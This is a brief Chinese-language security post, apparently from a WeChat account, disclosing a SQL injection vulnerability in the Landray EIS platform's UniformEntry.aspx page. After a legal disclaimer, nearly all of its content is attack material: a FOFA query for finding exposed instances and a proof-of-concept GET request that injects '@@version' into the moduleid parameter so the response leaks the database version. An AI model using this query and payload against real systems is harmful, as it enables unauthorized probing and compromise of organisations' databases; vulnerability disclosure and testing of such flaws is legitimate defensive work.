#  蓝凌EIS平台UniformEntry.aspx sql注入漏洞   
 HK安全小屋   2025-03-30 18:03  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
FOFA:  
```
app="Landray-EIS智慧协同平台"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI0ttM5lbOibia3icjVq89tJOJvTPmZ19jaL1wAYbrz5p7s99hggXiayhmSJRCb0nffEHXhJwibia8ibnb5WA/640?wx_fmt=png&from=appmsg "")  
  
  
POC  
```
GET /third/DingTalk/Pages/UniformEntry.aspx?moduleid=1%20and%201=@@version--+ HTTP/1.1
Host:{{Hostname}}
User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/109.0响应报文返回数据库版本
```  
  
响应包返回数据库版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI0ttM5lbOibia3icjVq89tJOJvZhcIOUDUNNaib6PAfkZ8tjAdJVpLmibibwB56znwFsicuceUiceJtVzt5PA/640?wx_fmt=png&from=appmsg "")  
  
  
  
